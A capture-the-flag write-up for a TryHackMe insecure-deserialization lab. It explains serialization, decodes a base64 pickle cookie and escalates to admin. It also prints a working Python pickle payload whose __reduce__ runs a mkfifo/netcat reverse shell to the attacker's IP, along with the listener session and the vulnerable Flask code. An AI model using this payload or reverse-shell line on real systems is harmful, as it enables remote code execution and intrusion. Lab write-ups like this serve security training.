# 07. Insecure Deserialization

## [Part 1. Before we start]

what is serialize and deserialize?

- Serialization in PHP or java is the process of converting a data structure, such as an array or an object, into a serialized format which is a string that represents the original data in a different way.

For example: 

1) **`serialize()`** function:

```html
$data = array("name" => "John", "age" => 25);
$serializedData = serialize($data);
```

⇒ a:2:{s:4:"name";s:4:"John";s:3:"age";i:25;}

2) **`unserialize()`** function:

```html
$originalData = unserialize($serializedData);
```

⇒ array("name" => "John", "age" => 25)

What is insecure deserialization?

- Insecure Deserialization is a vulnerability which occurs when untrusted data is used to abuse the logic of an application
- It replaces data processed by an application with malicious code which is serialized; allowing from dos to RCE
- this malicious code takes advantage of the legitimate serialization and deserialization process used by web applications.

Why OWASP-2017 ranks this vulnerability as 8 out of 10 ?

- Low exploitability - attacker needs to have a good understanding of the inner-workings of the application.
- The exploit is only as dangerous as the attacker's skill permits.

What is vulnerable ?

- Any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained.

A few examples of applications of this nature are:

- E-Commerce Sites
- Forums
- API's
- Application Runtimes (Tomcat, Jenkins, Jboss, etc)

Cookie is tiny pieces of data created by a website and stored on the user's computer. 

- Some cookies have additional attributes, a small list of these are below:

```
+-----------------+-------------------------------------+----------+
| Attribute       | Description                         | Required |
+-----------------+-------------------------------------+----------+
| Cookie Name     | The Name of the Cookie to be set    |   Yes    |
+-----------------+-------------------------------------+----------+
| Cookie Value    | Value, this can be anything         |   Yes    |
|                 |plaintex or encoded                  |          |
+-----------------+-------------------------------------+----------+
| Secure Only     | If set, this cookie will only be    |    No    |
|                 | set over HTTPS connections          |          |
+-----------------+-------------------------------------+----------+
| Expiry          | Set a timestamp where the cookie    |    No    |
|                 | be removed from the browser         |          |
+-----------------+-------------------------------------+----------+
| Path            | The cookie will only be sent if the |    No    |
|                 | specified URL is within the request |          |
+-----------------+-------------------------------------+----------+
```

## [Part 2. Insecure deserialization]

### I) Theory

1) Who developed the Tomcat application?

- Initially, i think of James Duncan Davidson but thm want the name of developers

**Result:** The Apache Software Foundation

2) What type of attack that crashes services can be performed with insecure deserialization?

**Result:** denial of service

3) if a dog was sleeping, would this be:

 **Result**: A Behaviour 

4) What is the name of the base-2 formatting that data is sent across a network as?

**Result:** binary

5) If a cookie had the path of [webapp.com/login](http://webapp.com/login) , what would the URL that the user has to visit be?

**Result:** webapp.com/login

6) What is the acronym for the web technology that Secure cookies work over?

**Result:** https

### II) Cature the flag

Target: 10.10.48.161

1) 1st flag (cookie value) 

- After loginning successfully, we check the cookie as the tryhackme guides and see the session ID which is really easy to be recognized as base64 encoded string

![Screenshot 2024-02-27 214927](https://github.com/vdh1612/CTF_write_up/assets/125654739/e18cfd6e-7a61-4e8d-a6bf-62e3c1ec194b)


- As i expect, there is a flag after decoding base 64

```
┌──(kali㉿kali)-[~/Downloads]
└─$ echo gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAZjY4NzBiMDg2YjdjNDc3OWIzNmMzODY3YTJlOWYwZDZxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg== | base64 -d  
�}q(X   sessionIdqX f6870b086b7c4779b36c3867a2e9f0d6qX
                                                      encodedflagqX▒THM{good_old_base64_huh}qu.                                                                                                                                                               

```

**Result:** THM{good_old_base64_huh}

- Just look at the cookie, we can see that this web is not sanitized and weak security right ! This is the reason why when we inject html, we always want to get user’s cookie although normal website doesn’t show clear information like uname and pw like this

2) 2nd flag (admin dashboard)

- Just need to change userType from user to admin and get the flag

Result: THM{heres_the_admin_flag} 

3) Get flag.txt

- Firstly, we click “Exchange your vim” and we will see new cookie with name is  encodedPayload and its value which is based64 encoded value
- Next, we click “Provide Feedback”, it will redirect to the page http://10.10.48.161/feedback
- According to tryhackme, the data entered in feedback will be encoded and sent to the Flask application. However, the server assumes that data encoded is trustworthy although this is untrusted data

```
cookie = { "replaceme" :payload}
//[?] serialize cookie 
pickle_payload = pickle. dumps(cookie)
//[?] encode the cookie which is serialized to base64
encodedPayIoadCookie = base64.b64encode(pickle_payload)
// back to /myprofile
resp = make_response( redirect( " /myprofile" ) )
// set the cookie with name encodedPayload and its value is encodedPayIoadCookie above
resp. set_cookie( "encodedPayload" , encodedPayIoadCookie)
```

+) Then the value of cookie is decoded and then deserialised on the server 

```
// get the value of cookie with name:encodedPayload
cookie = request.cookies.get( "encodedPayload" )
// decode and deserialise
cookie = pickle. base64.b64decode(cookie))
```

- Now, reverse shell is applied by using netcat command so that our system will start listening for incoming network connections on port 4444.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

**[+] `l`**: Initiates Netcat in listen mode. 

**[+] `v`**: Enables verbose mode, providing more detailed information about the connections.

**[+] `n`**: Do not resolve hostnames or port numbers. In numeric-only mode, addresses and ports will be printed numerically like 5555 or 7666 and not symbolically.

**[+] `-p 4444`**: Specifies the port number (4444 in this case) that Netcat will listen on.

- In this case, tryhackme has created a file pythons to generate serialised encoded64 data for us to RCE

```python
import pickle
import sys
import base64
//connect back to a machine with the IP address is YOUR_TRYHACKME_OPENVPN_IP on port 4444. 
command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_OPENVPN_IP 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```

- **`rm /tmp/f`**: Deletes any existing file named 'f' in the **`/tmp`** directory.
- **`mkfifo /tmp/f`**: Creates a named pipe (FIFO) named 'f' in the **`/tmp`** directory.
- **`cat /tmp/f | /bin/sh -i 2>&1`**: Reads the content from the named pipe 'f' and pipes it to a shell (**`/bin/sh`**) with an interactive (**`i`**) option. The **`2>&1`** part redirects standard error (stderr) to standard output (stdout).
- **`| netcat YOUR_TRYHACKME_OPENVPN_IP 4444`**: Pipes the output of the shell to the **`netcat`** command, which establishes a connection to the **`YOUR_TRYHACKME_OPENVPN_IP`** on port (4444).
- **`> /tmp/f`**: Redirects the output of the netcat command back into the named pipe 'f'. This allows bidirectional communication between the shell and the netcat listener.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 pickleme.py 
b'gASVdAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFlybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuMTcuMjQuNjYgNDQ0NCA+IC90bXAvZpSFlFKULg=='
```

- Next we copy the value and pasted it in cookie encodedPayload and refresh the page
- As we can see, we can stablish a connection to our OPENVPN machine IP on port 4444 from target IP which is website.

```
──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 4444     
listening on [any] 4444 ...
connect to [10.17.24.66] from (UNKNOWN) [10.10.141.188] 36242
$ whoami
cmnatic
$ ls
app.py
Dockerfile
index.html
launch.sh
__pycache__
requirements.txt
static
templates
user.html
venv
vimexchange.sock
wsgi.py
$ pwd
/home/cmnatic/app
```

- After a while trying to find file flag.txt, i can see it is in the dir /home/cmnatic

```
$ find / -type f -name flag.txt 2>/dev/null
/home/cmnatic/flag.txt
$ cat /home/cmnatic/flag.txt
4a69a7ff9fd68
```

- **`find`**: This command is used to search for files and directories in a directory hierarchy.
- **`/`**: Specifies the starting point for the search, which is the root directory.
- **`type f`**: Specifies that the search should only include regular files (not directories, symbolic links, etc.).
- **`name flag.txt`**: Specifies that the search should match files with the exact name "flag.txt".
- **`2>/dev/null`**: Redirects error messages (file not found, permission denied, etc.) to **`/dev/null`**. This is useful to avoid displaying error messages for directories where the user doesn't have permission to access.

[Notation] Last time, i try to reload the page http://10.10.141.188/myprofile so many times but it didn’t work even though i input the right cookie data in encodedPayload cookie. But incidentally, i try to click feedback and it load the code for us. 

[?] Why this happens?

- In /bin/sh, i cat the backend [app.py](http://app.py) to see clearly

```
$ cat app.py
from flask import Flask, redirect, render_template, make_response, request
from datetime import datetime

import uuid
import pickle
import base64

import sys

app = Flask(__name__)

@app.route("/")
def root():
    return render_template('index.html')

........
//[?] move to /feedback and it will deserialize for us !

@app.route("/feedback", methods=['GET', 'POST'])
def feedback():

    cookie = request.cookies.get("encodedPayload")
    cookie = pickle.loads(base64.b64decode(cookie))

    return render_template('feedback.html')

if __name__ == '__main__':
    app.run(host="0.0.0.0")
```
**Final result:** 4a69a7ff9fd68
